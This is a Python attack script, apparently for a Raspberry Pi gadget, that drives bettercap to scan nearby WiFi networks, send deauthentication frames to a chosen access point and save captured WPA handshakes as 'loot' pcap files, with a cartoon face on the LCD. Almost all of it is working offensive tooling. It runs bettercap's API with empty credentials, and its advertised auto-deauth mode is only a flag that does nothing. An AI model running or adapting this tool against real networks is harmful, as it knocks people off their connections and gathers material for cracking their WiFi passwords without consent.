#!/usr/bin/env python3
"""
KTOx Payload – Pwnagotchi (Bettercap Edition) with Loot Saving
===============================================================
Author: wickednull

Automated WPA handshake sniffer with Tamagotchi-style LCD.
Saves captured handshakes to /root/KTOx/loot/Handshakes/

Controls:
  OK        – force deauth on selected AP
  KEY1      – toggle auto-deauth mode (not fully implemented)
  KEY2      – show handshake log
  KEY3      – exit
"""

import os
import sys
import time
import json
import threading
import subprocess
import requests
import shutil
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()
f9 = font(9)

def draw_screen(lines, title="PWNAGOTCHI", title_color="#8B0000", text_color="#FFBBBB"):
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill=title_color)
    d.text((4,3), title[:20], font=f9, fill="#FF3333")
    y = 20
    for line in lines[:7]:
        d.text((4,y), line[:23], font=f9, fill=text_color)
        y += 12
    d.rectangle((0,H-12,W,H), fill="#220000")
    d.text((4,H-10), "OK=deauth  K1=auto  K2=log  K3=exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img,0,0)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Loot directories
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/Handshakes"
os.makedirs(LOOT_DIR, exist_ok=True)
HANDSHAKE_LOG = os.path.join(LOOT_DIR, "handshake_log.txt")

# ----------------------------------------------------------------------
# Bettercap REST API configuration
# ----------------------------------------------------------------------
BETTERCAP_HOST = "127.0.0.1"
BETTERCAP_PORT = 8081
API_URL = f"http://{BETTERCAP_HOST}:{BETTERCAP_PORT}/api"

SESSION_URL = f"{API_URL}/session"
WIFI_URL = f"{API_URL}/wifi"
EVENTS_URL = f"{API_URL}/events"

# Global state
handshake_count = 0
last_handshake_time = None
ap_count = 0
mood = "normal"
auto_deauth = True
bettercap_process = None
running = True
interface = "wlan0mon"
handshake_log = []       # list of strings for LCD display
bettercap_pcap = "/root/bettercap-wifi-handshakes.pcap"  # default location

def set_mood(new_mood):
    global mood
    mood = new_mood
    if new_mood == "happy":
        threading.Timer(3.0, lambda: set_mood("normal") if mood == "happy" else None).start()
    elif new_mood == "glitch":
        threading.Timer(1.0, lambda: set_mood("normal") if mood == "glitch" else None).start()

def save_handshake(bssid, essid, client):
    global handshake_count, handshake_log
    handshake_count += 1
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # Sanitize ESSID for filename
    safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30]
    if not safe_essid:
        safe_essid = "unknown"
    filename = f"{safe_essid}_{timestamp}.pcap"
    dest_path = os.path.join(LOOT_DIR, filename)
    # Copy the handshake file if it exists
    if os.path.exists(bettercap_pcap):
        shutil.copy2(bettercap_pcap, dest_path)
        # Also append to log file
        with open(HANDSHAKE_LOG, "a") as logf:
            logf.write(f"{timestamp} | BSSID: {bssid} | ESSID: {essid} | Client: {client} | File: {filename}\n")
    # Update LCD log
    log_entry = f"{timestamp[-5:]} {essid[:10]}"
    handshake_log.insert(0, log_entry)
    if len(handshake_log) > 5:
        handshake_log.pop()
    set_mood("happy")

# ----------------------------------------------------------------------
# Bettercap control
# ----------------------------------------------------------------------
def start_bettercap():
    global bettercap_process, interface
    # Find monitor interface
    result = subprocess.run("iw dev", shell=True, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if "Interface" in line and "mon" in line:
            interface = line.split()[1]
            break
    if not interface:
        draw_screen(["No monitor interface", "Run airmon-ng first"], title="ERROR")
        return False
    # Start bettercap with REST API and handshake saving
    cmd = [
        "bettercap", "-eval",
        f"set api.rest true; set api.rest.username ''; set api.rest.password ''; "
        f"wifi.recon on; wifi.show.sort clients desc; wifi.handshakes.file {bettercap_pcap}; "
        f"events.stream off; set wifi.interface {interface}; wifi.recon on"
    ]
    bettercap_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        r = requests.get(SESSION_URL, timeout=2)
        if r.status_code != 200:
            raise Exception("API not responding")
    except:
        draw_screen(["Bettercap API failed", "Check bettercap"], title="ERROR")
        return False
    return True

def stop_bettercap():
    global bettercap_process
    if bettercap_process:
        bettercap_process.terminate()
        bettercap_process.wait(timeout=2)
        bettercap_process = None

def get_wifi_data():
    try:
        r = requests.get(WIFI_URL, timeout=2)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def send_deauth(bssid):
    try:
        payload = {"bssid": bssid}
        r = requests.post(f"{WIFI_URL}/deauth", json=payload, timeout=2)
        if r.status_code == 200:
            set_mood("glitch")
            return True
    except:
        pass
    return False

def get_events():
    try:
        r = requests.get(EVENTS_URL, timeout=2)
        if r.status_code == 200:
            events = r.json()
            for ev in events:
                if "handshake" in ev.get("tag", "").lower():
                    data = ev.get("data", {})
                    bssid = data.get("bssid", "unknown")
                    essid = data.get("essid", "unknown")
                    client = data.get("client", "unknown")
                    # Only save if we have a valid handshake
                    if bssid != "unknown" and essid != "unknown":
                        save_handshake(bssid, essid, client)
    except:
        pass

# ----------------------------------------------------------------------
# Drawing character
# ----------------------------------------------------------------------
def draw_character(draw, mood):
    if mood == "happy":
        eye_color = "#00FF00"
        mouth = (58, 65, 70, 70)
    elif mood == "glitch":
        eye_color = "#FF00FF"
        mouth = (58, 65, 70, 70)
    else:
        eye_color = "#00AAFF"
        mouth = (58, 68, 70, 70)
    draw.rectangle((48, 30, 80, 70), outline="#00FFAA", width=1)
    draw.rectangle((54, 40, 60, 46), fill=eye_color)
    draw.rectangle((68, 40, 74, 46), fill=eye_color)
    draw.rectangle(mouth, outline="#FF3300", width=1)
    draw.line((64, 30, 64, 22), fill="#FF00AA", width=1)
    draw.ellipse((62, 18, 66, 22), fill="#FF00AA")
    if mood == "glitch":
        draw.rectangle((50, 35, 78, 55), outline="#FF00FF", width=1)

def update_display():
    global ap_count
    data = get_wifi_data()
    if data:
        ap_count = len(data.get("aps", []))
    uptime = int(time.time() - start_time)
    # Custom drawing
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "PWNAGOTCHI", font=f9, fill="#FF3333")
    # Stats
    y = 20
    d.text((4,y), f"HS: {handshake_count}  AP: {ap_count}", font=f9, fill="#FFBBBB")
    y += 12
    d.text((4,y), f"Uptime: {uptime}s", font=f9, fill="#FFBBBB")
    y += 12
    d.text((4,y), f"Auto: {'ON' if auto_deauth else 'OFF'}", font=f9, fill="#FFBBBB")
    y += 12
    d.text((4,y), f"Mood: {mood.upper()}", font=f9, fill="#FFBBBB")
    # Character
    draw_character(d, mood)
    # Footer
    d.rectangle((0,H-12,W,H), fill="#220000")
    d.text((4,H-10), "OK=deauth  K1=auto  K2=log  K3=exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img,0,0)

def show_log():
    log_lines = ["Recent Handshakes:"] + handshake_log[:5]
    if not handshake_log:
        log_lines = ["No handshakes yet"]
    draw_screen(log_lines, title="HANDSHAKE LOG", title_color="#004466")
    while True:
        if wait_btn(0.2) is not None:
            break
        time.sleep(0.05)

# ----------------------------------------------------------------------
# Background event loop
# ----------------------------------------------------------------------
def event_loop():
    while running:
        get_events()
        time.sleep(1)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
start_time = time.time()

def main():
    global auto_deauth, running
    if not start_bettercap():
        draw_screen(["Bettercap failed", "KEY3 to exit"], title="ERROR")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    threading.Thread(target=event_loop, daemon=True).start()

    while running:
        update_display()
        btn = wait_btn(0.5)
        if btn == "KEY3":
            break
        elif btn == "OK":
            data = get_wifi_data()
            if data and data.get("aps"):
                bssid = data["aps"][0].get("bssid")
                if bssid:
                    send_deauth(bssid)
                    draw_screen([f"Deauth sent to {bssid}"], title="DEAUTH")
                    time.sleep(1)
            else:
                draw_screen(["No APs to deauth"], title="DEAUTH")
                time.sleep(1)
        elif btn == "KEY1":
            auto_deauth = not auto_deauth
            draw_screen([f"Auto-deauth: {'ON' if auto_deauth else 'OFF'}"], title="SETTING")
            time.sleep(0.5)
        elif btn == "KEY2":
            show_log()
        time.sleep(0.05)

    stop_bettercap()
    GPIO.cleanup()
    draw_screen(["Pwnagotchi stopped", "KEY3 to exit"], title="EXIT")
    while wait_btn(0.5) != "KEY3":
        pass

if __name__ == "__main__":
    main()
